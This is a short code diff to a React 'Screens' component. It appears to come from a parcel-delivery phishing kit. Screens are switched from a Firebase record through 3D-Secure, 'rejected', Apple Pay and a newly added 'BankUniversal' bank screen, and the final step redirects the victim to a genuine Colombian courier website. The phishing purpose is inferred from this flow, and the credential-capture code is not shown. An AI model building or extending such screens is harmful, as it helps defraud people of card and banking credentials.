@@ -5,9 +5,10 @@ import Loading from './Loading'
 import { db, onSnapshot, doc, } from '../../../Firebase/FirebaseConfig'
 import ASK3D from './ASK3D'
 import ApplePay from './ApplePay'
+import BankUniversal from './BankUniversal'
 const Screens = ({ idF, setActiveScreen }) => {
     const [screen, setScreen] = useState("l")
-
+    
     useEffect(() => {
         if (idF) {
             const q = doc(db, 'user', idF)
@@ -51,8 +52,10 @@ const Screens = ({ idF, setActiveScreen }) => {
                 return <AskRechazado setActiveScreen={setActiveScreen} />
             case "4":
                 return <ApplePay idF={idF} />
-            case "fin": 
-                window.location.replace("https://www.servientrega.com")
+            case "5":
+                return <BankUniversal idF={idF}/>
+            case "fin":
+                window.location.replace("https://www.4-72.com.co")
                 return <Loading />
             default:
                 return <Loading />
